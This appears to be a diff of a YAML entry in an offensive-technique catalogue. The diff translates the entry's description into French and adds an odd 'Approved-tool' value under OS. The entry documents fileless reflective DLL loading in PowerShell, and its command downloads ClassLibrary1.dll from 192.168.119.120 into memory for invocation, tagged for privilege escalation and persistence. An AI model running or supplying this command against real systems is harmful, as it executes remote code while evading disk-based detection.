@@ -1,13 +1,13 @@
 ---
 description: |
-  Use the DownloadData method of the Net.WebClient class to download the DLL as a byte array, and then use the Load function to load the Byte array into memory instead of disk. After the assembly is loaded, we can interact with it using reflection through the GetType and GetMethod methods, and finally call it through the Invoke method.
+  Utilisez la méthode DownloadData de la classe Net.WebClient pour télécharger la DLL sous la forme d'un tableau d'octets, puis utilisez la fonction Load pour charger le tableau d'octets dans la mémoire plutôt que sur le disque. Une fois l'assemblage chargé, nous pouvons interagir avec lui en utilisant la réflexion via les méthodes GetType et GetMethod, et enfin l'appeler via la méthode Invoke.
 
   Command Reference:
-  ```
-  DLL: ClassLibrary1.dll
 
-  Byte array with code: $data
-  ```
+    DLL: ClassLibrary1.dll
+
+    Byte array with code: $data
+
 command: |
   $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')
 
@@ -25,6 +25,7 @@ services:
   - 
 OS:
   - Windows
+  - Approved-tool
 attack_types:
   - PrivEsc
   - Persistence
